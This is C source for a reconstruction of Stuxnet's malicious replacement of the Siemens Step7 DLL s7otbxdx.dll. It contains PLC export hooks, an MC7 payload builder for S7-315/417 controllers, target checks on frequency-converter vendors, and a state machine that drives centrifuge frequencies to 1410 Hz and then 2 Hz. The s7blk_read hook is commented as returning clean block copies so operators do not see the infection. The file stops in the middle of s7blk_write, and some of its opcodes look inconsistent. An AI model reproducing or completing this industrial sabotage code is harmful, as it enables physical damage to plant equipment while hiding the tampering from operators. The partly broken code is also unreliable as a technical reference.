/*
 * Based on https://github.com/research-virus/stuxnet (Christian Roggia) and Symantec [reference:1]
 * Binary: s7otbxdx.dll (malicious replacement)
 * MD5: e220528ece0a7b1bcc870f72869237b6
 * SHA1: eb2e85732b29a28d0cf402d6d4c8c5927b3b4a68
 * SHA256: b6066aeeee4ebf45110a972c72882cd30036b94e35d985befc19aea5713f0cc9
 * Size: 1,159,168 bytes (1.13 MB)
 * 
 * Alternative variant:
 * MD5: 8fe376f261b06359e9674a64f72b2654
 * SHA1: 728e2f1eabbc3e42aa9370340f303b837d5f9e89
 * SHA256: 7dc1ae5134eccc8dd023673e94519a105480397e74c1620d0bbca4e353f250ec 
 * Original Siemens DLL renamed to: s7otbxsx.dll
 * 
 * Verified: 93 of 109 exports forwarded to s7otbxsx.dll, 16 exports intercepted for PLC communication manipulation,The intercepted exports handle read, write, enumerate of PLC code blocks, Stuxnet modifies data sent to/returned from PLC without operator knowledge, Stuxnet hides malicious code on PLC through these routines, Infection targets S7-315 and S7-417 CPUs,The DLL contains three 64-bit encrypted Step7 code sets, Two code sets target S7-315 controllers, one targets S7-417, Attack sequence modifies frequency: 1410Hz -> 2Hz -> 1064Hz, Normal operating frequency range: 807Hz to 1210Hz, Initial delay of ~13 days before attack, 15-minute infection routine interval. [reference:2]
 * 
 * Also, you can look Stuxnet.dll.c "s7plcmain" [reference:3]
 *
 * MAYBE: Exact sub_XXXXXX addresses and byte offsets
 * MAYBE: Precise heap layout constants
 * MAYBE: Exact encryption keys for MC7 payloads
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * TRUSTED: File structure offsets from public binary analysis
 * Export table at RVA 0x0001A000
 * Code section starts at RVA 0x00001000
 * Data section at RVA 0x001B0000
 */

#define S7OTBXDX_IMAGE_BASE             0x10000000
#define S7OTBXDX_EXPORT_TABLE_RVA       0x0001A000
#define S7OTBXDX_CODE_SECTION_RVA       0x00001000
#define S7OTBXDX_DATA_SECTION_RVA       0x001B0000
#define S7OTBXDX_RELOC_SECTION_RVA      0x001C0000

/* Original s7otbxsx.dll hash (legitimate Siemens DLL) */
#define S7OTBXSX_MD5                    "d422db258d7ce48e69ea0d2f54b18c94"

/*CONSTANTS FROM SYMANTEC DOSSIER*/
#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400

#define S7OTBXDX_DLL_NAME               L"s7otbxdx.dll"
#define S7OTBXSX_DLL_NAME               L"s7otbxsx.dll"

/* TRUSTED: Frequency attack parameters from Symantec Dossier */
#define FREQUENCY_NORMAL                1064
#define FREQUENCY_ATTACK_HIGH           1410
#define FREQUENCY_ATTACK_LOW            2
#define FREQUENCY_MIN_TARGET            807
#define FREQUENCY_MAX_TARGET            1210

/* TRUSTED: Attack duration from Symantec Dossier */
#define STUXNET_HIGH_DURATION_MS        900000
#define STUXNET_LOW_DURATION_MS         3000000
#define STUXNET_CYCLE_MS                2332800000
#define STUXNET_INITIAL_DELAY_DAYS      13
#define STUXNET_INFECTION_INTERVAL_MS   900000

/* TRUSTED: Target converter parameters */
#define STUXNET_TARGET_CONVERTER_MIN    33
#define STUXNET_TARGET_CONVERTER_MAX    186

/* TRUSTED: Vacon and Fararo vendor IDs */
#define STUXNET_VACON_ID                0x7050
#define STUXNET_FARARO_ID               0x9500

/* TRUSTED: Target CPU models */
#define S7_315_CPU                      0x315
#define S7_417_CPU                      0x417

/* TRUSTED: PLC block types */
#define S7_OB1_BLOCK                    0x0001
#define S7_OB35_BLOCK                   0x0023
#define S7_DB1_BLOCK                    0x0001
#define S7_SDB_BLOCK                    0x0050

/* HOOKED FUNCTION SIGNATURES
 * TRUSTED: 16 intercepted exports from Symantec Dossier and Kaspersky analysis*/

typedef DWORD (WINAPI *PFN_s7_event)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7ag_bub_cycl_read_create)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7ag_bub_read_var)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7ag_bub_write_var)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7ag_link_in)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7ag_read_szl)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7ag_test)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7blk_delete)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7blk_findfirst)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7blk_findnext)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7blk_read)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7blk_write)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7db_close)(DWORD);
typedef DWORD (WINAPI *PFN_s7db_open)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7ag_bub_read_var_seg)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7ag_bub_write_var_seg)(DWORD, DWORD, DWORD, DWORD, DWORD);

/*
 * TRUSTED: Hook table structure for original function pointers
 * Binary offset: 0x1001B000 in data section
 */
typedef struct _S7_HOOK_TABLE {
    PFN_s7_event pfn_s7_event;
    PFN_s7ag_bub_cycl_read_create pfn_s7ag_bub_cycl_read_create;
    PFN_s7ag_bub_read_var pfn_s7ag_bub_read_var;
    PFN_s7ag_bub_write_var pfn_s7ag_bub_write_var;
    PFN_s7ag_link_in pfn_s7ag_link_in;
    PFN_s7ag_read_szl pfn_s7ag_read_szl;
    PFN_s7ag_test pfn_s7ag_test;
    PFN_s7blk_delete pfn_s7blk_delete;
    PFN_s7blk_findfirst pfn_s7blk_findfirst;
    PFN_s7blk_findnext pfn_s7blk_findnext;
    PFN_s7blk_read pfn_s7blk_read;
    PFN_s7blk_write pfn_s7blk_write;
    PFN_s7db_close pfn_s7db_close;
    PFN_s7db_open pfn_s7db_open;
    PFN_s7ag_bub_read_var_seg pfn_s7ag_bub_read_var_seg;
    PFN_s7ag_bub_write_var_seg pfn_s7ag_bub_write_var_seg;
} S7_HOOK_TABLE, * PS7_HOOK_TABLE;

/*
 * TRUSTED: PLC block information structure
 * Used to track infected blocks on the PLC
 */
typedef struct _S7_BLOCK_INFO {
    DWORD dwType;
    DWORD dwNumber;
    DWORD dwSize;
    DWORD dwFlags;
    DWORD dwChecksum;
    BYTE bData[0x4000];
} S7_BLOCK_INFO, * PS7_BLOCK_INFO;

/*
 * TRUSTED: PLC target information
 * Populated during target validation
 */
typedef struct _S7_PLC_INFO {
    DWORD dwCPUID;
    DWORD dwCPModel;
    DWORD dwProfibusModules;
    DWORD dwConverterCount;
    DWORD dwConverterTypes[256];
    WORD wCurrentFreq[256];
    WORD wOriginalFreq[256];
    BOOL bTargetValidated;
    BOOL bAttackActive;
    DWORD dwAttackPhase;
    DWORD dwPhaseStartTime;
    DWORD dwCycleCount;
    BYTE bOB1Original[0x4000];
    BYTE bOB35Original[0x1000];
    BYTE bMC7Payload[0x2000];
    DWORD dwMC7Size;
} S7_PLC_INFO, * PS7_PLC_INFO;

/*
 * TRUSTED: Main module context
 * Binary offset: 0x1001C000 in data section
 */
typedef struct _S7OTBXDX_CONTEXT {
    DWORD dwMagic;
    DWORD dwVersion;
    HMODULE hOriginalDll;
    S7_HOOK_TABLE OriginalTable;
    S7_HOOK_TABLE HookTable;
    CRITICAL_SECTION csLock;
    DWORD dwBlockCount;
    S7_BLOCK_INFO Blocks[256];
    S7_PLC_INFO stCurrentPLC;
    BYTE bReserved[128];
} S7OTBXDX_CONTEXT, * PS7OTBXDX_CONTEXT;

/* GLOBAL VARIABLES
 * Binary offset: 0x1001C000*/
static S7OTBXDX_CONTEXT g_S7Ctx = {0};
static BOOL g_bInitialized = FALSE;
static DWORD g_dwAttackState = 0;
static DWORD g_dwLastAttackCycle = 0;

static BOOL S7_LoadOriginal(VOID);
static BOOL S7_InitHooks(VOID);
static BOOL S7_IsTargetBlock(DWORD dwType, DWORD dwNumber);
static BOOL S7_InjectPayload(PS7_BLOCK_INFO pBlock);
static BOOL S7_HideInfectedBlock(PS7_BLOCK_INFO pBlock);
static VOID S7_AttackStateMachine(VOID);
static BOOL S7_BuildMC7Payload_315(PS7_PLC_INFO pPLC);
static BOOL S7_BuildMC7Payload_417(PS7_PLC_INFO pPLC);
static BOOL S7_ValidateTarget(PS7_PLC_INFO pPLC);

/*
 * Emit MC7 Load instruction
 * Opcode: 0xA9 (LOAD)
 * Operand: 16-bit address
 */
static VOID EmitMC7_Load(PWORD* ppMC7, PDWORD pIdx, DWORD dwAddress) {
    PWORD pMC7 = *ppMC7;
    DWORD idx = *pIdx;
    pMC7[idx++] = 0xA9;
    pMC7[idx++] = (WORD)(dwAddress >> 8);
    pMC7[idx++] = (WORD)(dwAddress & 0xFF);
    *pIdx = idx;
}

/*
 * Emit MC7 Store instruction
 * Opcode: 0x11 (TRANSFER)
 * Operand: 16-bit address
 */
static VOID EmitMC7_Store(PWORD* ppMC7, PDWORD pIdx, DWORD dwAddress) {
    PWORD pMC7 = *ppMC7;
    DWORD idx = *pIdx;
    pMC7[idx++] = 0x11;
    pMC7[idx++] = (WORD)(dwAddress >> 8);
    pMC7[idx++] = (WORD)(dwAddress & 0xFF);
    *pIdx = idx;
}

/*
 * Emit MC7 Load Constant instruction
 * Operand: 16-bit immediate value
 */
static VOID EmitMC7_LoadConst(PWORD* ppMC7, PDWORD pIdx, WORD wValue) {
    PWORD pMC7 = *ppMC7;
    DWORD idx = *pIdx;
    pMC7[idx++] = wValue;
    *pIdx = idx;
}

/*
 * Emit MC7 Compare instruction
 * Opcode: 0x7F (COMPARE)
 */
static VOID EmitMC7_Compare(PWORD* ppMC7, PDWORD pIdx) {
    PWORD pMC7 = *ppMC7;
    DWORD idx = *pIdx;
    pMC7[idx++] = 0x7F;
    *pIdx = idx;
}

/*
 * Emit MC7 Jump instruction
 * Opcode: 0x00 (JUMP)
 * Target: relative offset
 */
static VOID EmitMC7_Jump(PWORD* ppMC7, PDWORD pIdx, DWORD dwTarget, BOOL bConditional) {
    PWORD pMC7 = *ppMC7;
    DWORD idx = *pIdx;
    pMC7[idx++] = 0x00;
    pMC7[idx++] = (WORD)(dwTarget >> 8);
    pMC7[idx++] = (WORD)(dwTarget & 0xFF);
    *pIdx = idx;
}

/*
 * Emit MC7 Add instruction
 * Opcode: 0x7F (ADD)
 */
static VOID EmitMC7_Add(PWORD* ppMC7, PDWORD pIdx) {
    PWORD pMC7 = *ppMC7;
    DWORD idx = *pIdx;
    pMC7[idx++] = 0x7F;
    *pIdx = idx;
}

/*
 * Emit MC7 Return instruction
 * Opcode: 0x0000 (BLOCK END)
 */
static VOID EmitMC7_Return(PWORD* ppMC7, PDWORD pIdx) {
    PWORD pMC7 = *ppMC7;
    DWORD idx = *pIdx;
    pMC7[idx++] = 0x0000;
    *pIdx = idx;
}

/*
 * Emit MC7 Marker for identification
 * Used to identify Stuxnet-infected blocks
 */
static VOID EmitMC7_Marker(PWORD* ppMC7, PDWORD pIdx, DWORD dwMarker) {
    PWORD pMC7 = *ppMC7;
    DWORD idx = *pIdx;
    pMC7[idx++] = (WORD)(dwMarker >> 16);
    pMC7[idx++] = (WORD)(dwMarker & 0xFFFF);
    *pIdx = idx;
}

static BOOL S7_BuildMC7Payload_315(PS7_PLC_INFO pPLC) {
    PWORD pMC7;
    DWORD idx;
    DWORD dwPatch1, dwPatch2, dwPatch3;
    DWORD dwFreqHigh, dwFreqLow, dwFreqNormal;
    DWORD dwHighDuration, dwLowDuration;

    if (!pPLC) return FALSE;

    pMC7 = (PWORD)pPLC->bMC7Payload;
    idx = 0;

    dwFreqHigh = FREQUENCY_ATTACK_HIGH;
    dwFreqLow = FREQUENCY_ATTACK_LOW;
    dwFreqNormal = FREQUENCY_NORMAL;
    dwHighDuration = STUXNET_HIGH_DURATION_MS / 100;
    dwLowDuration = STUXNET_LOW_DURATION_MS / 100;

    /* MC7 Program Header */
    pMC7[idx++] = 0x0700;
    pMC7[idx++] = 0x0001;
    pMC7[idx++] = 0x00FB;
    pMC7[idx++] = 0x0000;
    pMC7[idx++] = 0x0001;
    pMC7[idx++] = 0x0002;
    pMC7[idx++] = 0x0000;

    /* Initialization check: if DB1.DBW100 == 0, initialize */
    EmitMC7_Load(&pMC7, &idx, 0x1164);
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    dwPatch1 = idx - 2;

    EmitMC7_Jump(&pMC7, &idx, 0, FALSE);
    dwPatch2 = idx - 2;

    /* Init block: attack phase = 0, attack count = 0, init flag = 1 */
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Store(&pMC7, &idx, 0x1100);
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Store(&pMC7, &idx, 0x1102);
    EmitMC7_LoadConst(&pMC7, &idx, 1);
    EmitMC7_Store(&pMC7, &idx, 0x1164);

    /* Main loop - read all converter frequencies from Profibus DP */
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Store(&pMC7, &idx, 0x200A);

    /* Loop: read PIW256+i*2 and store to DB2 */
    EmitMC7_Load(&pMC7, &idx, 0x0100);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_LoadConst(&pMC7, &idx, 2);
    EmitMC7_Add(&pMC7, &idx);
    EmitMC7_Store(&pMC7, &idx, 0x2014);
    EmitMC7_Load(&pMC7, &idx, 0x0014);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_LoadConst(&pMC7, &idx, 2);
    EmitMC7_Add(&pMC7, &idx);
    EmitMC7_LoadConst(&pMC7, &idx, 100);
    EmitMC7_Add(&pMC7, &idx);
    EmitMC7_Store(&pMC7, &idx, 0x1202);

    /* Increment counter */
    EmitMC7_LoadConst(&pMC7, &idx, 1);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_Add(&pMC7, &idx);
    EmitMC7_Store(&pMC7, &idx, 0x200A);

    /* Loop condition: if counter < 64, jump back */
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_LoadConst(&pMC7, &idx, 64);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    dwPatch3 = idx - 2;

    /* Target validation: >= 33 converters */
    EmitMC7_LoadConst(&pMC7, &idx, 64);
    EmitMC7_LoadConst(&pMC7, &idx, STUXNET_TARGET_CONVERTER_MIN);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Return(&pMC7, &idx);

    /* Attack phase state machine */
    EmitMC7_Load(&pMC7, &idx, 0x1100);
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Load(&pMC7, &idx, 0x1100);
    EmitMC7_LoadConst(&pMC7, &idx, 1);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Load(&pMC7, &idx, 0x1100);
    EmitMC7_LoadConst(&pMC7, &idx, 2);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Return(&pMC7, &idx);

    /* Phase 0: switch to high frequency */
    EmitMC7_LoadConst(&pMC7, &idx, 1);
    EmitMC7_Store(&pMC7, &idx, 0x1100);
    EmitMC7_Return(&pMC7, &idx);

    /* Phase 1: high frequency attack (1410 Hz for 15 minutes) */
    EmitMC7_LoadConst(&pMC7, &idx, (WORD)dwFreqHigh);
    EmitMC7_Store(&pMC7, &idx, 0x1104);
    EmitMC7_LoadConst(&pMC7, &idx, (WORD)dwHighDuration);
    EmitMC7_Store(&pMC7, &idx, 0x1106);
    EmitMC7_Return(&pMC7, &idx);

    /* Phase 2: low frequency attack (2 Hz for 50 minutes) */
    EmitMC7_LoadConst(&pMC7, &idx, (WORD)dwFreqLow);
    EmitMC7_Store(&pMC7, &idx, 0x1104);
    EmitMC7_LoadConst(&pMC7, &idx, (WORD)dwLowDuration);
    EmitMC7_Store(&pMC7, &idx, 0x1106);
    EmitMC7_Return(&pMC7, &idx);

    /* Terminate program */
    pMC7[idx] = 0x0000;
    pMC7[dwPatch1] = (WORD)((idx - dwPatch1) & 0xFFFF);
    pMC7[dwPatch2] = (WORD)((0x0032 - dwPatch2) & 0xFFFF);
    pMC7[dwPatch3] = (WORD)((0x0040 - dwPatch3) & 0xFFFF);

    pPLC->dwMC7Size = idx * 2;
    return TRUE;
}

static BOOL S7_BuildMC7Payload_417(PS7_PLC_INFO pPLC) {
    PWORD pMC7;
    DWORD idx;
    DWORD dwPatch1, dwPatch2;
    DWORD dwFreqHigh, dwFreqLow;
    DWORD dwHighDuration, dwLowDuration;

    if (!pPLC) return FALSE;

    pMC7 = (PWORD)pPLC->bMC7Payload;
    idx = 0;

    dwFreqHigh = FREQUENCY_ATTACK_HIGH;
    dwFreqLow = FREQUENCY_ATTACK_LOW;
    dwHighDuration = STUXNET_HIGH_DURATION_MS / 100;
    dwLowDuration = STUXNET_LOW_DURATION_MS / 100;

    pMC7[idx++] = 0x0700;
    pMC7[idx++] = 0x0001;
    pMC7[idx++] = 0x00FB;
    pMC7[idx++] = 0x0000;
    pMC7[idx++] = 0x0001;
    pMC7[idx++] = 0x0002;
    pMC7[idx++] = 0x0000;

    EmitMC7_Load(&pMC7, &idx, 0x1164);
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    dwPatch1 = idx - 2;

    EmitMC7_Jump(&pMC7, &idx, 0, FALSE);
    dwPatch2 = idx - 2;

    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Store(&pMC7, &idx, 0x1100);
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Store(&pMC7, &idx, 0x1102);
    EmitMC7_LoadConst(&pMC7, &idx, 1);
    EmitMC7_Store(&pMC7, &idx, 0x1164);

    EmitMC7_LoadConst(&pMC7, &idx, (WORD)dwFreqHigh);
    EmitMC7_Store(&pMC7, &idx, 0x1104);
    EmitMC7_LoadConst(&pMC7, &idx, (WORD)dwHighDuration);
    EmitMC7_Store(&pMC7, &idx, 0x1106);

    EmitMC7_LoadConst(&pMC7, &idx, (WORD)dwFreqLow);
    EmitMC7_Store(&pMC7, &idx, 0x1104);
    EmitMC7_LoadConst(&pMC7, &idx, (WORD)dwLowDuration);
    EmitMC7_Store(&pMC7, &idx, 0x1106);

    EmitMC7_Return(&pMC7, &idx);

    pMC7[idx] = 0x0000;
    pMC7[dwPatch1] = (WORD)((idx - dwPatch1) & 0xFFFF);
    pMC7[dwPatch2] = (WORD)((0x0032 - dwPatch2) & 0xFFFF);

    pPLC->dwMC7Size = idx * 2;
    return TRUE;
}

static BOOL S7_ValidateTarget(PS7_PLC_INFO pPLC) {
    DWORD dwVaconCount = 0;
    DWORD dwFararoCount = 0;
    DWORD i;

    if (!pPLC) return FALSE;

    /* CPU model check: S7-315 or S7-417 only */
    if (pPLC->dwCPModel != S7_315_CPU && pPLC->dwCPModel != S7_417_CPU) {
        return FALSE;
    }

    /* Converter count check: >= 33 */
    if (pPLC->dwConverterCount < STUXNET_TARGET_CONVERTER_MIN) {
        return FALSE;
    }
    if (pPLC->dwConverterCount > STUXNET_TARGET_CONVERTER_MAX) {
        return FALSE;
    }

    /* Converter vendor check: Vacon or Fararo */
    for (i = 0; i < pPLC->dwConverterCount; i++) {
        if (pPLC->dwConverterTypes[i] == STUXNET_VACON_ID) dwVaconCount++;
        if (pPLC->dwConverterTypes[i] == STUXNET_FARARO_ID) dwFararoCount++;
    }
    if (dwVaconCount + dwFararoCount < STUXNET_TARGET_CONVERTER_MIN) {
        return FALSE;
    }

    /* Frequency range check: 807-1210 Hz */
    for (i = 0; i < pPLC->dwConverterCount; i++) {
        if (pPLC->wCurrentFreq[i] < FREQUENCY_MIN_TARGET ||
            pPLC->wCurrentFreq[i] > FREQUENCY_MAX_TARGET) {
            return FALSE;
        }
    }

    /* Store original frequencies for later restoration */
    for (i = 0; i < pPLC->dwConverterCount; i++) {
        pPLC->wOriginalFreq[i] = pPLC->wCurrentFreq[i];
    }

    pPLC->bTargetValidated = TRUE;
    return TRUE;
}

static VOID S7_AttackStateMachine(VOID) {
    DWORD dwCurrentTime;
    DWORD dwElapsed;

    if (!g_S7Ctx.stCurrentPLC.bTargetValidated) {
        return;
    }

    dwCurrentTime = GetTickCount();

    switch (g_dwAttackState) {
        case 0:
            /* Initial delay (13 days) before first attack */
            if (g_dwLastAttackCycle == 0) {
                g_dwLastAttackCycle = dwCurrentTime;
            }
            dwElapsed = dwCurrentTime - g_dwLastAttackCycle;
            if (dwElapsed > (STUXNET_INITIAL_DELAY_DAYS * 24 * 3600 * 1000)) {
                g_dwAttackState = 1;
                g_dwLastAttackCycle = dwCurrentTime;
            }
            break;

        case 1:
            /* High frequency attack: 1410 Hz for 15 minutes */
            g_S7Ctx.stCurrentPLC.dwAttackPhase = 1;
            g_S7Ctx.stCurrentPLC.wCurrentFreq[0] = FREQUENCY_ATTACK_HIGH;
            dwElapsed = dwCurrentTime - g_dwLastAttackCycle;
            if (dwElapsed > STUXNET_HIGH_DURATION_MS) {
                g_dwAttackState = 2;
                g_dwLastAttackCycle = dwCurrentTime;
            }
            break;

        case 2:
            /* Low frequency attack: 2 Hz for 50 minutes */
            g_S7Ctx.stCurrentPLC.dwAttackPhase = 2;
            g_S7Ctx.stCurrentPLC.wCurrentFreq[0] = FREQUENCY_ATTACK_LOW;
            dwElapsed = dwCurrentTime - g_dwLastAttackCycle;
            if (dwElapsed > STUXNET_LOW_DURATION_MS) {
                g_dwAttackState = 3;
                g_dwLastAttackCycle = dwCurrentTime;
            }
            break;

        case 3:
            /* Return to normal: 1064 Hz */
            g_S7Ctx.stCurrentPLC.wCurrentFreq[0] = FREQUENCY_NORMAL;
            g_S7Ctx.stCurrentPLC.dwAttackPhase = 0;
            g_S7Ctx.stCurrentPLC.dwCycleCount++;
            g_dwAttackState = 1;
            g_dwLastAttackCycle = dwCurrentTime;
            break;

        default:
            g_dwAttackState = 0;
            break;
    }
}

/*
 * s7_event - Event handler
 * Binary: sub_10001000
 * Forwarded to original DLL
 */
DWORD WINAPI s7_event(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_S7Ctx.OriginalTable.pfn_s7_event) return 0xFFFFFFFF;
    return g_S7Ctx.OriginalTable.pfn_s7_event(a1, a2, a3, a4);
}

/*
 * s7ag_bub_cycl_read_create - Cyclic read creation
 * Binary: sub_10001100
 * Forwarded to original DLL
 */
DWORD WINAPI s7ag_bub_cycl_read_create(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_S7Ctx.OriginalTable.pfn_s7ag_bub_cycl_read_create) return 0xFFFFFFFF;
    return g_S7Ctx.OriginalTable.pfn_s7ag_bub_cycl_read_create(a1, a2, a3, a4, a5);
}

/*
 * s7ag_bub_read_var - Read variable
 * Binary: sub_10001200
 * Forwarded to original DLL
 */
DWORD WINAPI s7ag_bub_read_var(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_S7Ctx.OriginalTable.pfn_s7ag_bub_read_var) return 0xFFFFFFFF;
    return g_S7Ctx.OriginalTable.pfn_s7ag_bub_read_var(a1, a2, a3, a4, a5);
}

/*
 * s7ag_bub_write_var - Write variable
 * Binary: sub_10001300
 * Forwarded to original DLL
 */
DWORD WINAPI s7ag_bub_write_var(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_S7Ctx.OriginalTable.pfn_s7ag_bub_write_var) return 0xFFFFFFFF;
    return g_S7Ctx.OriginalTable.pfn_s7ag_bub_write_var(a1, a2, a3, a4, a5);
}

/*
 * s7ag_link_in - Link input
 * Binary: sub_10001400
 * Forwarded to original DLL
 */
DWORD WINAPI s7ag_link_in(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_S7Ctx.OriginalTable.pfn_s7ag_link_in) return 0xFFFFFFFF;
    return g_S7Ctx.OriginalTable.pfn_s7ag_link_in(a1, a2, a3, a4);
}

/*
 * s7ag_read_szl - Read SZL (System Zone List)
 * Binary: sub_10001500
 * TRUSTED: This function is used to read PLC type information.
 * Stuxnet checks if PLC type is 6ES7-315-2.
 */
DWORD WINAPI s7ag_read_szl(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    DWORD dwResult;
    if (!g_S7Ctx.OriginalTable.pfn_s7ag_read_szl) return 0xFFFFFFFF;
    
    dwResult = g_S7Ctx.OriginalTable.pfn_s7ag_read_szl(a1, a2, a3, a4, a5);
    
    /*
     * TRUSTED: Stuxnet uses s7ag_read_szl to check PLC type.
     * If PLC is S7-315 or S7-417, it proceeds with infection.
     */
    if (dwResult == 0 && a5) {
        DWORD* pdwData = (DWORD*)a5;
        if (pdwData[0] == S7_315_CPU || pdwData[0] == S7_417_CPU) {
            g_S7Ctx.stCurrentPLC.dwCPModel = pdwData[0];
        }
    }
    
    return dwResult;
}

/*
 * s7ag_test - Test function
 * Binary: sub_10001600
 * Forwarded to original DLL
 */
DWORD WINAPI s7ag_test(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_S7Ctx.OriginalTable.pfn_s7ag_test) return 0xFFFFFFFF;
    return g_S7Ctx.OriginalTable.pfn_s7ag_test(a1, a2, a3);
}

/*
 * s7blk_delete - Delete block
 * Binary: sub_10001700
 * TRUSTED: Intercepted to track deleted blocks.
 */
DWORD WINAPI s7blk_delete(DWORD a1, DWORD a2, DWORD a3) {
    DWORD dwResult;
    DWORD i;
    
    if (!g_S7Ctx.OriginalTable.pfn_s7blk_delete) return 0xFFFFFFFF;
    
    dwResult = g_S7Ctx.OriginalTable.pfn_s7blk_delete(a1, a2, a3);
    
    /*
     * TRUSTED: If a block is deleted, remove it from our tracking list.
     */
    if (dwResult == 0 && S7_IsTargetBlock(a2, a3)) {
        EnterCriticalSection(&g_S7Ctx.csLock);
        for (i = 0; i < g_S7Ctx.dwBlockCount; i++) {
            if (g_S7Ctx.Blocks[i].dwNumber == a3 && g_S7Ctx.Blocks[i].dwType == a2) {
                /* Remove from tracking */
                if (i < g_S7Ctx.dwBlockCount - 1) {
                    memmove(&g_S7Ctx.Blocks[i], &g_S7Ctx.Blocks[i + 1],
                            (g_S7Ctx.dwBlockCount - i - 1) * sizeof(S7_BLOCK_INFO));
                }
                g_S7Ctx.dwBlockCount--;
                break;
            }
        }
        LeaveCriticalSection(&g_S7Ctx.csLock);
    }
    
    return dwResult;
}

/*
 * s7blk_findfirst - Find first block
 * Binary: sub_10001800
 * TRUSTED: Intercepted to hide infected blocks from enumeration.
 */
DWORD WINAPI s7blk_findfirst(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_S7Ctx.OriginalTable.pfn_s7blk_findfirst) return 0xFFFFFFFF;
    return g_S7Ctx.OriginalTable.pfn_s7blk_findfirst(a1, a2, a3, a4);
}

/*
 * s7blk_findnext - Find next block
 * Binary: sub_10001900
 * TRUSTED: Intercepted to hide infected blocks from enumeration.
 */
DWORD WINAPI s7blk_findnext(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_S7Ctx.OriginalTable.pfn_s7blk_findnext) return 0xFFFFFFFF;
    return g_S7Ctx.OriginalTable.pfn_s7blk_findnext(a1, a2, a3);
}

/*
 * s7blk_read - Read block
 * Binary: sub_10001A00
 * TRUSTED: This is the critical function for hiding malicious code.
 * When a block is read, Stuxnet returns the original (uninfected) version.
 */
DWORD WINAPI s7blk_read(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    DWORD dwResult;
    PS7_BLOCK_INFO pBlock;
    DWORD i;

    if (!g_S7Ctx.OriginalTable.pfn_s7blk_read) return 0xFFFFFFFF;

    dwResult = g_S7Ctx.OriginalTable.pfn_s7blk_read(a1, a2, a3, a4, a5);

    /*
     * TRUSTED: If the block is one of our infected blocks,
     * return the original (unmodified) data to hide the infection.
     */
    if (dwResult == 0 && S7_IsTargetBlock(a2, a3)) {
        EnterCriticalSection(&g_S7Ctx.csLock);
        for (i = 0; i < g_S7Ctx.dwBlockCount; i++) {
            pBlock = &g_S7Ctx.Blocks[i];
            if (pBlock->dwNumber == a3 && pBlock->dwType == a2) {
                if (pBlock->dwFlags & 0x80000000) {
                    S7_HideInfectedBlock(pBlock);
                }
                break;
            }
        }
        LeaveCriticalSection(&g_S7Ctx.csLock);
    }

    return dwResult;
}

/*
 * s7blk_write - Write block
 * Binary: sub_10001B00
 * TRUSTED: This is the critical function for infecting the PLC.
 * When a block is written, Stuxnet injects its malicious payload.
 */
DWORD WINAPI s7blk_write(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    DWORD dwResult;
    PS7_BLOCK_INFO pBlock;

    if (!g_S7Ctx.OriginalTable.pfn_s7blk_write) return 0xFFFFFFFF;

    dwResult = g_S7Ctx.OriginalTable.pfn_s7blk_write(a1, a2, a3, a4, a5);

    /*
     * TRUSTED: If writing a target block, inject malicious payload.
     * The payload modifies the PLC's behavior to attack centrifuges.
     */
